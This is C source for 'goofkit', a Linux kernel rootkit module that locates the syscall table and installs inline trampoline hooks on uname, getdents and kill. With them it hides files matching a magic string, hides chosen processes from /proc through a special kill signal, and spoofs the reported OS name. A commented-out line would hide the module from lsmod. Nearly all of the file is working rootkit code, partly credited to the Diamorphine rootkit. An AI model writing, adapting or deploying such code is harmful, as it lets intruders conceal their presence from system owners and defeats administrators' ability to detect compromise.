/*
Project: goofkit
Author: Jack "Hulto" McKenna 🇺🇸  & Rayne Cafaro🤔
Description: trampolining rootkit. Used to hide files, proccesses, and network connections from the user.
Task:
## Comms with rootkti ##
*/
#include "goof.h"

//User defined variables
#include "user.h"



// Iterate over the entire possible range until you find some __NR_close
/* Find the syscall table.
   We will use this to refrence all of the syscalls that we want to overwrite.
   This is a necessary step since in recent versions of linux the syscall table is not exported.*/
unsigned long *find(void) {
	unsigned long *sctable;
	unsigned long int i = (unsigned long int)sys_close;
	while (i < ULONG_MAX) {
		sctable = (unsigned long *) i;
		if (sctable[__NR_close] == (unsigned long) sys_close) {

			return sctable;
		}

		i += sizeof(void *);
	}

	return NULL;
}

int goofy_uname(struct utsname *buf){
	//Execute original funciton
	//Calling the original function to fill out our buf variable.
	//Any additions need to happen after the inline assembly otherwise
	//The original function will return strange garbage
	int (*func_ptr)(struct utsname *) = (void *)hooks[0]->trampoline;
	int ret = func_ptr(buf);		

	//Value we want to set	
	char tmp[] = "Macos";
	//Setting the value, buf appears to exist in user space so we need
	//to use the copy to user function
	copy_to_user(buf->sysname, tmp, 5);

	//Printk to kernel buffer to make sure everything is working.
	return ret;
}

int goofy_getdents(unsigned int fd, struct linux_dirent * dire, unsigned int count){
	//Execute original funciton
	int (*func_ptr)(unsigned int, struct linux_dirent *, unsigned int) = (void *)hooks[1]->trampoline;
	int ret = func_ptr(fd, dire, count), new_len = 0;		
	if(!ret) { return ret; }

	//ret_dire is the dirent struct we're building with allowed files.
	//k_dire is a copy of the dirent array struct in the kernel.
	//cur_dire is a pointer used during iteration to read the values of each dirent.
	struct linux_dirent *ret_dire = kmalloc(ret, GFP_KERNEL);
	if(!ret_dire){ kfree(ret_dire); return -1; }
	struct linux_dirent *k_dire = kmalloc(ret, GFP_KERNEL);
	if(!k_dire){ kfree(k_dire); return -1; }
	struct linux_dirent *cur_dire;
	int throw_away_variable_just_ignore_this_garbage_output = copy_from_user(k_dire, dire, ret);

	struct inode *d_inode;
	int proc = 0;

	// From the Diamorphine rootkit
	#if LINUX_VERSION_CODE < KERNEL_VERSION(3, 19, 0)
		d_inode = current->files->fdt->fd[fd]->f_dentry->d_inode;
	#else
		d_inode = current->files->fdt->fd[fd]->f_path.dentry->d_inode;
	#endif

	if (d_inode->i_ino == PROC_ROOT_INO && !MAJOR(d_inode->i_rdev)){
		// Check to see if root inode == 1 and is not a device
		proc = 1;	
	}

	//Iterate through all of dire
	
	for(int i = 0; i < ret;){
		//Set cur_dire
		unsigned char *ptr = (unsigned char *)k_dire;
		ptr = ptr + i;
		cur_dire = (struct linux_dirent *)ptr;
		//Check if the cur_dire name contains magic string
		if(strstr(cur_dire->d_name, MAGIC_STRING) != NULL){
			//DEBUG if does print to buffer
		}else if(proc && is_hidden_proc(simple_strtoul(cur_dire->d_name, NULL, 10))){
			//Else if process to hide, hide /proc/pid
		}else{
			//Else append it to the ret_dire struct
			memcpy((void*)ret_dire+new_len, cur_dire, cur_dire->d_reclen);
			new_len += cur_dire->d_reclen;	
		}
		i += cur_dire->d_reclen;	
	}
	throw_away_variable_just_ignore_this_garbage_output = copy_to_user(dire, ret_dire, new_len);
	ret = new_len;
	
	kfree(k_dire);
	kfree(ret_dire);	
	return ret;	
}

/// ### Credit: https://github.com/m0nad/Diamorphine/blob/master/diamorphine.c ###
/// More efficent than using an expanding array of PIDs
struct task_struct *find_task(pid_t pid){
	struct task_struct *tmp = current;
	//Iterate through each process to find the desired process
	for_each_process(tmp) {
		if(tmp->pid == pid){
			return tmp;
		}
	}
	return NULL;
}
/// Check if process is hidden👀
int is_hidden_proc(pid_t pid){
	//If pid DNE return
	if(pid == 0){ return 0; }
	struct task_struct *res;
	res = find_task(pid);
	//If res DNE return
	if(res == 0){ return 0; }
	//If hidden return 1
	if(res->flags & HIDDEN){
		return 1;
	}

	return 0;
}

//### END CREDIT ###

/// @param pid the process ID of the process where the signal
///		is being sent
/// @param sig the signal being sent to the process. If this
///		signal is one of our defined ones goofy_kill prevents
///		the process from being killed and will hide or elevate
///		prems.
int goofy_kill(pid_t pid, int sig){
	//printk("[goof] goofy_kill\n");
	/*FAULT - invalid opcode - Relative jump is wreking everything :(
		waiting for LDE+ to be finished to implement in-line hooking
		*/
	//int (*func_ptr)(pid_t, int) = (void *)hooks[2]->trampoline;
	//int ret = func_ptr(pid, sig);
	struct task_struct *res;
	if(sig == HIDE_SIG){
		//pid_task(find_vpid(pid), PIDTYPE_PID); --- doesn't work b/c we're not GPL
		res = find_task(pid);
		//XOR allows us to hide and unhide the process
		res->flags ^= HIDDEN;
		return 0;
	}
	int ret = original_kill(pid, sig);
	return ret;
}

/* @brief create and insert inline hook, create trampoline
 * 
 * It's a beast... I'll try to include a diagram.
 * 
 * 1. Save the first <h_len> bytes from the original syscall to our struct
 * 2. Create an inline hook by setting jump to all \x90 then copying the JUMP_TEMPLATE over the bytes
 * 3. Copy the destination address into the jump (over the \x11\x22\x33\x44\x55\x66\x77\x88 value)
 * 4. Build the trampoline.
 *		-Copy jump template to end of original code copy from step 1
 *		-Copy the address of the syscall (just after where we copied in step 1, syscall+h_len+1) over the place holder \x11\x22\x33\x44\x55\x66\x77\x88 
 * 5. Write the hook created in steps 2 & 3 over the first h_len bytes in the system call
 *		-Requires disabling write protect
 *		-Renable afterwards so things don't break unexpectedly
 *
 * @param src where original source code is coming from
 *   	and where the new code is going
 * @param new_func the goofy function that is hooking
 *		the original function
 *	@param id numeric identifier that will define tho hook
 *		struct in an array of hook structs
*/
unsigned char *create_tramp(unsigned long *src, unsigned long *new_func, unsigned int id, unsigned int h_len){
	printk("[goof] hooking %p with %p\n", src, new_func);
	unsigned char *tmp = (unsigned char *)src;
	struct Hook *h = kmalloc(sizeof(struct Hook), GFP_KERNEL);
	
	//Define hook in array
	hooks[id] = h;

	//Define original and new
	h->og_func = (unsigned char *) src;
	h->new_func = (unsigned char *)new_func;

	//TODO auto determine hook length using LDE
	h->hook_len = h_len;

	//~~~~~~~original_code~~~~~~~~~~~	
	//Create a backup of the original code to be
	//used in creating the trampoline and when
	//the rootkits exits to clean up restoring
	//original functions.
	h->original_code = kmalloc(h->hook_len, GFP_KERNEL);
	memcpy(h->original_code, src, h->hook_len);

	//~~~~~~~trampoline~~~~~~~~~~~	
	//Create the trampoline that will be called by
	//the goofy function and jump back into the
	//syscall instructions at offset +hook_len
	//Memory must be executable
	//Allocate enough memory to accomodate the length of the syscall specific hook
	//and also our jump back (15 bytes)
	h->trampoline =  __vmalloc(h->hook_len + HOOK_LEN, GFP_KERNEL, PAGE_KERNEL_EXEC);
	memcpy(h->trampoline, h->original_code, h->hook_len);
	
	//Create jump back
	unsigned char *jump_back = kmalloc(HOOK_LEN, GFP_KERNEL);
	
	//Copy in template
	memcpy(jump_back, JUMP_TEMPLATE, HOOK_LEN);
	
	//Fill in template
	tmp = (unsigned char *)src+h->hook_len;
	memcpy(jump_back+2, &tmp, 8);
	
	//Copy jump back into template
	memcpy(h->trampoline+h->hook_len, jump_back, h->hook_len);

	kfree(jump_back);

	//Verify that trampoline is correct
	//Should be originial code and then jump
	//back to syscall + hook_len	

	printk("\n[goof] trampoline %p\n\t[goof] ", h->trampoline);
    for(int i = 0; i < h->hook_len*2; i++){
        printk("%02x ", h->trampoline[i]);
    }
    printk("\n");

	//~~~~~~~Insert hook into syscall~~~~~~~~~~~	
	unsigned char *jump = kmalloc(h->hook_len, GFP_KERNEL);
	memset(jump, 0x90, h->hook_len);
	memcpy(jump, JUMP_TEMPLATE, HOOK_LEN);
	
	//Fill in template with address of our new function
	//Not sure that +0x5 is required.
	//TODO Test it with and without +0x5
	tmp = ((unsigned char *)new_func);
	memcpy(jump+2, &tmp, 8);	

	//Write hook to syscall table
	printk("[goof] Memory hasn't been written\n");
	DISABLE_W_PROTECTED_MEMORY
	memcpy(src, jump, h->hook_len);
	ENABLE_W_PROTECTED_MEMORY

	return NULL;
}

/* @brief remove a trampoline based on its ID
 *
 * @param id numeric identifier of the hook to be removed
*/
void remove_tramp(unsigned int id ){
	//Write old code back to the original syscall
	DISABLE_W_PROTECTED_MEMORY
	memcpy(hooks[id]->og_func, hooks[id]->original_code, hooks[id]->hook_len);	
	ENABLE_W_PROTECTED_MEMORY
}

//Defines the maximum number of hooks to be stored in the array
#define HOOKS_COUNT 3

static int __init
goof_init(void) {
	//Hide kernel module from lsmod 
	//list_del_init(&__this_module.list);
	//kobject_del(&THIS_MODULE->mkobj.kobj);

	printk("[goof] module loaded\n");

	hooks = kmalloc(sizeof(struct Hook *)*HOOKS_COUNT, GFP_KERNEL);

	//Find base syscall address	
	__sys_call_table = find(); 

	//Update table with hooked code
	//Regular way to hook syscall
	//original_uname = __sys_call_table[__NR_uname];
	//__sys_call_table[__NR_uname] = goofy_uname;

	//Trampolining way to overwrite syscall  
	create_tramp((unsigned long*)__sys_call_table[__NR_uname], (unsigned long *)goofy_uname, 0, 16);
	create_tramp((unsigned long*)__sys_call_table[__NR_getdents], (unsigned long *)goofy_getdents, 1, 15);
	
	//Waiting on LDE+ to create these into trampoline hooks
	//LDE+ needed  bto check if instruction is relative jump that needs to be decoded.
	original_kill = __sys_call_table[__NR_kill];
	__sys_call_table[__NR_kill] = goofy_kill;

	//NO - waiting on an LDE @Scott Court
	//create_tramp((unsigned long*)__sys_call_table[__NR_kill], (unsigned long *)goofy_kill, 2, 16);
	//Creating a new trampoline - DEBUG
	
	printk("[goof] DEBUG\n ");
	unsigned char *ptr_tmp = (unsigned char *)__sys_call_table[__NR_kill];
	for(int i = 0; i < 32; i++){
		printk("%02x ", ptr_tmp[i]);
	}
	printk("\n");


	return 0;
}
static void __exit
goof_exit(void) {

	remove_tramp(0);
	remove_tramp(1);


	__sys_call_table[__NR_kill] = original_kill;


	//remove_tramp(2);
	printk("[goof] module removed\n");
	return;
}

module_init(goof_init);
module_exit(goof_exit);

MODULE_LICENSE("MIT");
